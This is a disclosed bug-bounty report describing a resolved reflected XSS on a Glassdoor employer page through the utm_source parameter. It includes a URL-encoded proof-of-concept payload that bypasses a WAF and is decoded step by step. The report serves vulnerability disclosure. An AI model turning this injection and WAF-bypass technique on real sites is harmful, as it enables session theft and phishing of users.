---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '846338'
original_report_id: '846338'
title: Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2020-04-10T10:16:52.521Z'
disclosed_at: '2020-05-22T15:17:02.452Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 642
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/

## Metadata

- HackerOne Report ID: 846338
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2020-05-22T15:17:02.452Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
There is a reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/ through the utm_source parameter. By using URL encoding I was able to bypass the WAF.

Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/

Affected Parameter:
utm_source

Vulnerability Type:
XSS

Browsers tested:
Firefox 75.0

## Steps To Reproduce:
  1. Visit the following POC link:
```
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```

## Explanation
The utm_source parameter is not escaped properly for URL encoded values. We can escape at multiple locations in the source. I escaped in the script section. The payload finished open function calls from jQuery, executes an alert as POC and then finished the original script tag. Basically we can dissect it as follows:
```
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e

is url encoded for

abc`;return+false});});alert`xss`;</script>

which is used like

abc`;                       Finish the string
return+false});      Finish the jQuery click function
});                            Finish the jQuery ready function
alert`xss`;              Here we can execute our code
</script>               This closes the script tag to prevent JavaScript parsing errors
```

## Supporting Material/References (screenshots, logs, videos):
{F782251}

## Impact

A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
